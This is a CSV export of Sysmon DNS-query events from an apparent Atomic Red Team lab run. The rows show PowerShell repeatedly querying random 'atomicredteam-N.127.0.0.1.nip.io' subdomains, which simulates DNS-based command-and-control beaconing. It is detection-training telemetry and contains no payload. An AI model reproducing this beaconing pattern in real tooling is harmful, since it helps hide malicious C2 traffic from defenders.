"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174195,"Query: atomicredteam-139504.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.766","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174196,"Query: atomicredteam-893927.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.806","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174197,"Query: atomicredteam-711552.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.846","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174198,"Query: atomicredteam-863390.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.886","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174199,"Query: atomicredteam-607069.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.928","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174200,"Query: atomicredteam-361542.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:48.969","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174201,"Query: atomicredteam-571741.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.008","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:49.176 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174202,"Query: atomicredteam-291887.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.049","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174203,"Query: atomicredteam-125005.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.088","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174204,"Query: atomicredteam-608717.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.259","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174205,"Query: atomicredteam-630397.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.300","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174206,"Query: atomicredteam-108487.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.475","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174207,"Query: atomicredteam-558448.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.517","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.187 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174208,"Query: atomicredteam-91123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.561","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.188 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174209,"Query: atomicredteam-682168.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.889","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.188 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174210,"Query: atomicredteam-416913.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.930","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:50.188 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174211,"Query: atomicredteam-603097.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:49.974","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.754 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174212,"Query: atomicredteam-846495.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.018","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.755 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174213,"Query: atomicredteam-773530.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.061","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.755 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174214,"Query: atomicredteam-39950.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.233","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:53.755 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174215,"Query: atomicredteam-544782.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.404","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:54.534 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174216,"Query: atomicredteam-215169.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.445","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:54.534 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174217,"Query: atomicredteam-839645.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:50.484","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.581 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174218,"Query: atomicredteam-356356.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:53.839","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.581 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174219,"Query: atomicredteam-376976.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.081","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174220,"Query: atomicredteam-660083.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.417","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.582 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174221,"Query: atomicredteam-948123.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.462","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:55.593 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174222,"Query: atomicredteam-463612.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.502","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174223,"Query: atomicredteam-619713.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.573","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174224,"Query: atomicredteam-184644.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:54.795","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174225,"Query: atomicredteam-136488.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:55.503","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174226,"Query: atomicredteam-145665.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:55.615","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174227,"Query: atomicredteam-649580.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:55.750","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174228,"Query: atomicredteam-789334.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.217","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:56.415 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174229,"Query: atomicredteam-981411.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.272","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:57.735 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174230,"Query: atomicredteam-766589.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.396","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:57.735 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174231,"Query: atomicredteam-978626.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.481","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174234,"Query: atomicredteam-186120.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.520","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174235,"Query: atomicredteam-132946.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:56.660","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174236,"Query: atomicredteam-51468.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.720","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.091 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174237,"Query: atomicredteam-932017.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.758","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.092 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174238,"Query: atomicredteam-912709.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.823","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.092 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174239,"Query: atomicredteam-186796.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.873","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.092 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174240,"Query: atomicredteam-586842.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.944","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.092 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174241,"Query: atomicredteam-730190.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:57.998","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.092 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174242,"Query: atomicredteam-170821.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:58.072","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.444 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174243,"Query: atomicredteam-328514.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:58.414","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
"2025-12-26 11:26:59.444 +01:00","DNS Query","info","DESKTOP-G2OBL3D","Sysmon",22,"","","sysmon",174244,"Query: atomicredteam-29809.127.0.0.1.nip.io ¦ Result: - ¦ Proc: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe ¦ PID: 7660 ¦ PGUID: E9F06A57-62C4-694E-3F02-000000002400","QueryStatus: 9501 ¦ User: DESKTOP-G2OBL3D\student ¦ UtcTime: 2025-12-26 10:26:59.099","Sysmon_22_Info_DNS-Query.yml","d98f628c-2579-4388-bacc-381433b28e5b","C:\Tools\Logs\art_1071_004x.evtx"
